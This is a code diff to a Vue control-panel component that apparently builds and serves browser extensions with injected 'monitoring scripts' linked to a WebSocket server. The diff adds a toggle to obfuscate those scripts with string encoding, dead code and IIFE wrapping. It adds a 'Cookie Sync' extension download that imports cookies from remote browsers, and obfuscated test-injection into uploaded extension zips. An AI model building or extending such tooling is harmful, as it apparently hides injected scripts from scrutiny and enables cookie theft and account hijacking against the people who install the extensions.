@@ -21,16 +21,20 @@ interface ValidateResult {
 
 const wsUrl = ref('')
 const embed = ref('none')
+const obfuscate = ref(false)
 const targets = ref<EmbedTarget[]>([])
 const loading = ref(false)
 
 const uploadFile = ref<File | null>(null)
+const uploadFileName = ref('')
 const uploadValidation = ref<ValidateResult | null>(null)
 const uploading = ref(false)
 const injecting = ref(false)
 const saving = ref(false)
 const saveId = ref('')
 const uploadMsg = ref<{ type: 'ok' | 'err'; text: string } | null>(null)
+
+const fileInputRef = ref<HTMLInputElement | null>(null)
 
 const defaultWsUrl = computed(() => {
   const host = window.location.hostname
@@ -58,6 +62,9 @@ function download(): void {
   if (embed.value && embed.value !== 'none') {
     params.set('embed', embed.value)
   }
+  if (obfuscate.value) {
+    params.set('obfuscate', '1')
+  }
   const url = `/api/v1/extension/download?${params.toString()}`
   const a = document.createElement('a')
   a.href = url
@@ -68,10 +75,31 @@ function download(): void {
   setTimeout(() => { loading.value = false }, 1500)
 }
 
+function downloadCookieSync(): void {
+  const params = new URLSearchParams()
+  params.set('ws_url', wsUrl.value || defaultWsUrl.value)
+  params.set('embed', 'cookie-sync')
+  if (obfuscate.value) {
+    params.set('obfuscate', '1')
+  }
+  const url = `/api/v1/extension/download?${params.toString()}`
+  const a = document.createElement('a')
+  a.href = url
+  a.download = ''
+  document.body.appendChild(a)
+  a.click()
+  a.remove()
+}
+
+function triggerFileInput(): void {
+  fileInputRef.value?.click()
+}
+
 function onFileSelect(e: Event): void {
   const input = e.target as HTMLInputElement
   if (input.files?.length) {
     uploadFile.value = input.files[0]
+    uploadFileName.value = input.files[0].name
     uploadValidation.value = null
     uploadMsg.value = null
     saveId.value = input.files[0].name.replace(/\.zip$/i, '').replace(/[^a-zA-Z0-9_-]/g, '-')
@@ -111,6 +139,7 @@ async function testInject(): Promise<void> {
     const fd = new FormData()
     fd.append('extension', uploadFile.value)
     fd.append('ws_url', wsUrl.value || defaultWsUrl.value)
+    if (obfuscate.value) fd.append('obfuscate', '1')
     const res = await fetch('/api/v1/extension/upload-test', {
       method: 'POST',
       credentials: 'same-origin',
@@ -214,6 +243,21 @@ async function deleteTarget(id: string): Promise<void> {
       </p>
     </label>
 
+    <!-- Obfuscation toggle -->
+    <label class="flex items-center gap-2.5 cursor-pointer select-none">
+      <input
+        v-model="obfuscate"
+        type="checkbox"
+        class="w-4 h-4 rounded border border-border-subtle bg-bg-base text-accent focus:ring-accent/40 focus:ring-1 cursor-pointer"
+      >
+      <div>
+        <span class="text-[13px] text-fg-base">Obfuscate JavaScript</span>
+        <p class="text-[11px] text-fg-faint">
+          Apply string encoding, dead code injection, and IIFE wrapping to monitoring scripts.
+        </p>
+      </div>
+    </label>
+
     <!-- Embed targets management -->
     <div v-if="targets.length > 0" class="space-y-1">
       <span class="text-[11px] uppercase tracking-wider text-fg-muted">
@@ -242,6 +286,19 @@ async function deleteTarget(id: string): Promise<void> {
     </Btn>
   </section>
 
+  <!-- Cookie Sync Extension download -->
+  <section class="surface p-5 space-y-3">
+    <div>
+      <h2 class="text-[13px] font-semibold">Cookie Sync extension</h2>
+      <p class="text-[12px] text-fg-muted mt-0.5">
+        Client-side extension for syncing cookies, managing proxy connections, and importing cookies from remote browsers.
+      </p>
+    </div>
+    <Btn variant="subtle" @click="downloadCookieSync">
+      Download Cookie Sync .zip
+    </Btn>
+  </section>
+
   <!-- Upload & Test Inject section -->
   <section class="surface p-5 space-y-4">
     <div>
@@ -251,17 +308,26 @@ async function deleteTarget(id: string): Promise<void> {
       </p>
     </div>
 
-    <label class="block">
+    <div>
       <span class="block text-[11px] uppercase tracking-wider text-fg-muted mb-1.5">
         Extension zip file
       </span>
-      <input
-        type="file"
-        accept=".zip"
-        class="w-full text-[12px] text-fg-muted file:mr-3 file:py-1.5 file:px-3 file:rounded file:border-0 file:text-[12px] file:bg-accent/20 file:text-accent file:cursor-pointer hover:file:bg-accent/30"
-        @change="onFileSelect"
-      >
-    </label>
+      <div class="flex items-center gap-3">
+        <input
+          ref="fileInputRef"
+          type="file"
+          accept=".zip"
+          class="hidden"
+          @change="onFileSelect"
+        >
+        <Btn variant="subtle" @click="triggerFileInput">
+          Choose file
+        </Btn>
+        <span class="text-[12px] text-fg-muted truncate">
+          {{ uploadFileName || 'No file selected' }}
+        </span>
+      </div>
+    </div>
 
     <div v-if="uploadFile" class="space-y-3">
       <!-- Validate button -->
